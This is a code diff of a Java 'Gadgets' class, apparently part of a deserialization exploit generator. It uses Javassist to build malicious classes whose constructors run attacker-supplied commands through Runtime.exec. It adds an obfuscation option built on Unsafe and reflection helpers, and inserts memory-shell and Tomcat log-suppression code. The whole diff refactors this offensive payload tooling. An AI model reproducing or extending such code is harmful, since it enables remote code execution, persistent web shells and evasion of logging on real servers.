@@ -179,17 +179,19 @@ public class Gadgets {
 
 		// 如果 Command 不为空，则是普通的命令执行
 		if (command != null) {
-			ctClass = pool.makeClass(newClassName);
-			insertCMD(ctClass);
-			CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
-			ctConstructor.setBody("{execCmd(\"" + command + "\");}");
-			ctClass.addConstructor(ctConstructor);
-
-			// 最短化
-//			ctClass = pool.makeClass(newClassName);
-//			CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
-//			ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
-//			ctClass.addConstructor(ctConstructor);
+			if (IS_OBSCURE) {
+				ctClass = pool.makeClass(newClassName);
+				insertCMD(ctClass);
+				CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
+				ctConstructor.setBody("{execCmd(\"" + command + "\");}");
+				ctClass.addConstructor(ctConstructor);
+			} else {
+				// 最短化
+				ctClass = pool.makeClass(newClassName);
+				CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
+				ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
+				ctClass.addConstructor(ctConstructor);
+			}
 
 			// 如果全局配置继承，再设置父类
 			if (IS_INHERIT_ABSTRACT_TRANSLET) {
@@ -274,7 +276,7 @@ public class Gadgets {
 
 			// Struts2ActionMS 额外处理
 			if (className.contains("Struts2ActionMS")) {
-				insertField(ctClass, "thisClass", "public static String thisClass = \"" + base64Encode(classBytes) + "\";");
+				insertField(ctClass, "thisClass", "public static String thisClass = \"" + base64Encode(ctClass.toBytecode()) + "\";");
 			}
 		}
 
@@ -413,17 +415,7 @@ public class Gadgets {
 				ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
 			}
 
-			try {
-				ctClass.getDeclaredMethod("getMethodByClass");
-			} catch (NotFoundException e) {
-				ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_BY_CLASS), ctClass));
-			}
-
-			try {
-				ctClass.getDeclaredMethod("getMethodAndInvoke");
-			} catch (NotFoundException e) {
-				ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE), ctClass));
-			}
+			insertGetMethodAndInvoke(ctClass);
 
 			if (IS_OBSCURE) {
 				ctClass.addMethod(CtMethod.make(base64Decode(GET_UNSAFE), ctClass));
@@ -522,6 +514,7 @@ public class Gadgets {
 				insertTomcatNoLog(ctClass);
 				insertMethod(ctClass, method, base64Decode(CMD_SHELL_FOR_TOMCAT));
 			} else {
+				insertGetMethodAndInvoke(ctClass);
 				insertMethod(ctClass, method, base64Decode(CMD_SHELL));
 			}
 		}
@@ -545,10 +538,8 @@ public class Gadgets {
 	 * @throws Exception 抛出异常
 	 */
 	public static void insertCMD(CtClass ctClass) throws Exception {
-
-		ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_BY_CLASS), ctClass));
-
 		if (IS_OBSCURE) {
+			ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_BY_CLASS), ctClass));
 			ctClass.addMethod(CtMethod.make(base64Decode(GET_UNSAFE), ctClass));
 			ctClass.addMethod(CtMethod.make(base64Decode(TO_CSTRING_Method), ctClass));
 			ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE_OBSCURE), ctClass));
@@ -559,12 +550,6 @@ public class Gadgets {
 			}
 			ctClass.addMethod(CtMethod.make(base64Decode(EXEC_CMD_OBSCURE), ctClass));
 		} else {
-			try {
-				ctClass.getDeclaredMethod("getMethodAndInvoke");
-			} catch (NotFoundException e) {
-				ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE), ctClass));
-			}
-
 			ctClass.addMethod(CtMethod.make(base64Decode(EXEC_CMD), ctClass));
 		}
 	}
@@ -579,14 +564,7 @@ public class Gadgets {
 		ctClass.addField(CtField.make(fieldCode, ctClass));
 	}
 
-	public static void insertTomcatNoLog(CtClass ctClass) throws Exception {
-
-		try {
-			ctClass.getDeclaredMethod("getFieldValue");
-		} catch (NotFoundException e) {
-			ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
-		}
-
+	public static void insertGetMethodAndInvoke(CtClass ctClass) throws Exception {
 		try {
 			ctClass.getDeclaredMethod("getMethodByClass");
 		} catch (NotFoundException e) {
@@ -602,7 +580,16 @@ public class Gadgets {
 				ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE), ctClass));
 			}
 		}
+	}
 
+	public static void insertTomcatNoLog(CtClass ctClass) throws Exception {
+
+		try {
+			ctClass.getDeclaredMethod("getFieldValue");
+		} catch (NotFoundException e) {
+			ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
+		}
+		insertGetMethodAndInvoke(ctClass);
 		ctClass.addMethod(CtMethod.make(base64Decode(TOMCAT_NO_LOG), ctClass));
 	}
 
